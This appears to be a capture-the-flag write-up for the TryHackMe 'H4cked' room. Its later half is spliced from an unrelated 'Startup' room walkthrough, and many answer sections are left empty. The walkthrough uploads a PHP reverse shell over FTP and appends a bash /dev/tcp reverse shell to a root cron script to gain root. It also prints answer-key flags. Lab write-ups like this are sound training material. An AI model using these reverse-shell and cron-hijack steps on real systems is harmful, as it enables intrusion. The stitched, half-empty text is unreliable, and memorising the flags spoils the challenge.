# H4cked

<div align="left">

<figure><img src=".gitbook/assets/spaces_EhofjMfYbx3gOUSReXD7_uploads_git-blob-09d7b5dbac78c58c7b74721476ee6617c8b73086_startup (1).png" alt=""><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure>

</div>

🔗[ H4cked](https://tryhackme.com/room/h4cked)

### Task 1 - Starting

**Description/Note**: Find out what happened by analysing a .pcap file and hack your way back into the machine

### Task 2 - Reconnaissance

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

```
mkdir thm/h4cked.thm
cd thm/h4cked.thm
mkdir {nmap,content,exploits,scripts}
```

We don't need to deploy machine, but we need to analyze pcap file to explore activities and answer at questions.

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Source IP that sent SYN is `192.168.0.147` then, it's Attacker IP, while destination/victim IP is: `192.168.0.115.`

### 2.1 - The attacker is trying to log into a specific service. What service is this?

Following first message, we can find that attacker brute force FTP port.

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
FTP
{% endhint %}

### 2.2 - There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?

{% hint style="info" %}
Hydra
{% endhint %}

### 2.3 - The attacker is trying to log on with a specific username. What is the username?

Looking FTP request we can find it:

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
jenny
{% endhint %}

### 2.4 - What is the user's password?

Following TCP stream we found that correct psw is:

<div align="left">

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

</div>

{% hint style="info" %}
password123
{% endhint %}

### 2.5 - What is the current FTP working directory after the attacker logged in? 

\






\


### 2.6 - The attacker uploaded a backdoor. What is the backdoor's filename? 

\




{% hint style="info" %}

{% endhint %}

### 2.7 - The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?&#x20;





{% hint style="info" %}

{% endhint %}

### 2.8 - Which command did the attacker manually execute after getting a reverse shell?



{% hint style="info" %}

{% endhint %}



### 2.9 - What is the computer's hostname?



{% hint style="info" %}

{% endhint %}

###

### 2.10 - Which command did the attacker execute to spawn a new TTY shell?

\


{% hint style="info" %}

{% endhint %}



### &#x20;2.11 - Which command was executed to gain a root shell? 

\


{% hint style="info" %}

{% endhint %}

\


### 2.12 - The attacker downloaded something from GitHub. What is the name of the GitHub project? 

\
\


\


{% hint style="info" %}

{% endhint %}

\


### 2.13 - The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?

\


{% hint style="info" %}

{% endhint %}

\






## Task 3 - Hack your way back into the machine

Deploy the machine.

The attacker has changed the user's password! Can you replicate the attacker's steps and read the flag.txt? The flag is located in the /root/Reptile directory. Remember, you can always look back at the .pcap file if necessary. Good luck!

### 3.1 - Run Hydra (or any similar tool) on the FTP service. The attacker might not have chosen a complex password. You might get lucky if you use a common word list. 

\
\


\


{% hint style="info" %}

{% endhint %}

\


### 3.2 - Change the necessary values inside the web shell and upload it to the webserver



\


{% hint style="info" %}

{% endhint %}

\


### 3.3 - Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server. 

\


\


{% hint style="info" %}

{% endhint %}



### &#x20;3.4 - Become root!   

\


{% hint style="info" %}

{% endhint %}

\


### 3.5 - Read the flag.txt file inside the Reptile directory 

\




```bash
```

```bash
l
```

<details>

<summary>🚩 Flag (root.txt)</summary>



</details>

###



\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_



Using gobuster we try to find hidden path

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 10-31-10.png" alt=""><figcaption></figcaption></figure>

The best solution is to create a .php reverse shell and put in ftp folder via FTP

We copy php-reverse-shell.php just ready from php webshells folder

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

and custom it using our IP and Port:

```bash
ano php-reverse-shell.php
```

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 10-51-58.png" alt=""><figcaption></figcaption></figure>

Rename it:

```bash
mv php-reverse-shell.php shell.php
```

and put in ftp folder via FTP:

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 10-54-53.png" alt=""><figcaption></figcaption></figure>

and start netcat on the same reverse shell port (444):

```bash
nc -lvnp 444
```

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-03-57.png" alt=""><figcaption></figcaption></figure>

Now, we're in! Check flags here..

<div align="left">

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-09-08.png" alt=""><figcaption></figcaption></figure>

</div>

We see an interesting file "recipe.txt", and we find information that we need!

```bash
cat recipe.txt
```

_Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love._

{% hint style="info" %}
love
{% endhint %}

### Task 3 - What are the contents of user.txt?

We quickly try to find user.txt flag using find command:\


```bash
find / -type f -iname user.txt 2>/dev/null
```

but we don't find anything! Then we need to explore files or escalate privileges

We notes an interesting dir called: incidents, with suspicious.pcapng (wireshark ext), we try to get it, but permission is denied!

Then, we can use netcat to open a new connection and transfer it:

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-25-20.png" alt=""><figcaption></figcaption></figure>

We can analyze susp.pcap file using wireshark or strings:

```bash
strings susp.pcap
```

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-33-24.png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-37-44 (1).png" alt=""><figcaption></figcaption></figure>

We see this psw: c4ntg3t3n0ughsp1c3 we can try to use it!

```bash
ssh lennie@startup.thm
```

```bash
lennie@startup.thm's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

44 packages can be updated.
30 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ ls
Documents  scripts  user.txt
$ cat user.txt
```

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

</details>

### Task 4 - What are the contents of root.txt?

We can continue to explore files:

```bash
ls -lah *
    -rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
    
    Documents:
    total 20K
    drwxr-xr-x 2 lennie lennie 4.0K Nov 12  2020 .
    drwx------ 5 lennie lennie 4.0K May 15 13:37 ..
    -rw-r--r-- 1 root   root    139 Nov 12  2020 concern.txt
    -rw-r--r-- 1 root   root     47 Nov 12  2020 list.txt
    -rw-r--r-- 1 root   root    101 Nov 12  2020 note.txt
    
    scripts:
    total 16K
    drwxr-xr-x 2 root   root   4.0K Nov 12  2020 .
    drwx------ 5 lennie lennie 4.0K May 15 13:37 ..
    -rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
    -rw-r--r-- 1 root   root      1 May 15 13:38 startup_list.txt

cat scripts/*
cat Documents/*
cat /etc/print.sh
ls -lah /etc/print.sh
	-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

We see that planner.sh will be run as root (with a cron job), and use /etc/print.sh with lennie permission, we can modify it inserting a reverse shell as payload:

```bash
echo "/bin/bash -i >& /dev/tcp/10.9.80.228/666 0>&1" >> /etc/print.sh                                                     
```

Then, we run on our kali machine netcat on the same port (666):

```bash
nc -nvlp 666
```

and wait root that will run the planner.sh script once a minute.

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 12-37-21.png" alt=""><figcaption></figcaption></figure>

Well done! We find root flag:

```bash
ls
cat root.txt
```

<div align="left">

<figure><img src=".gitbook/assets/Schermata del 2023-07-30 12-38-55.png" alt=""><figcaption></figcaption></figure>

</div>

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

THM{f963aaa6a430f210222158ae15c3d76d}

</details>
